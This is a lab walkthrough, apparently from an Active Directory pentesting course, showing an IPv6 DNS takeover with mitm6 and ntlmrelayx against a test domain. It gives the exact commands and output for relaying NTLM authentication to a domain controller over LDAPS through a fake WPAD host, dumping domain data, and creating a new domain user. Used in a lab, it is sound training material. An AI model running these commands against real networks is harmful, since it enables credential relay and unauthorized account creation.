
First of all install [pimpmykali](https://github.com/Dewalt-arch/pimpmykali) cos' the tool `mitm6` doesn't come pre-installed with kali linux

![](https://i.imgur.com/SyvCBNl.png)

Change directory to `/opt/mitm6` and install the necessary requirements

```shell
sec-fortress@Pwn-F0rk-3X3C:/opt/mitm6$ cd /opt/mitm6      

sec-fortress@Pwn-F0rk-3X3C:/opt/mitm6$ sudo pip2 install .

sec-fortress@Pwn-F0rk-3X3C:/opt/mitm6$ cd ~         

sec-fortress@Pwn-F0rk-3X3C:~$ 
```

![](https://i.imgur.com/jIbtM8b.jpg)

### Setting up ntlmrelayx and mitm6

On your terminal do :

```shell
sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD$ sudo ntlmrelayx.py -6 -t ldaps://192.168.0.110 -wh fakewpad.marvel.local -l bankai

Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
```

Note that `-6` represents IPv6 `-t` for DC-IP address `-wh` for fake web proxy auto-discovery `-l` will create a folder named **bankai**

Then start up the `mitm6` server with the following command :

```shell
sec-fortress@Pwn-F0rk-3X3C:~$ sudo mitm6 -d marvel.local
```

![](https://i.imgur.com/S8Go70A.png)

Now we can go ahead and re-boot our `THE-PUNISHER` machine and focus on our terminal

>Note that the target we interact with depends on our output

![](https://i.imgur.com/3DID7Ig.png)

Checking your present folder, `~/PEH/AD` , you should have a folder with the folder name when you specified the `-l` option, this folder contains sensitive files in **html, grep and json** format (HTML formats are the best)

The highlighted ones as shown below are very important :

![](https://i.imgur.com/yysEMrW.png)

We can also do other stuff like creating another user, first of all we can login as the local admin

![](https://i.imgur.com/0VwsLjf.jpg)

Then since this is recorded as an event, we can go back to our `ntlmrelayx.py` tool page on your terminal, checking the output you should see a new user created with the password

![](https://i.imgur.com/FcNSdmh.png)

PS: If you can't find one just restart your `mitm6` tool and `ntlmrelayx.py` , also try restarting the system (THE-PUNISHER), you should see it 🤟



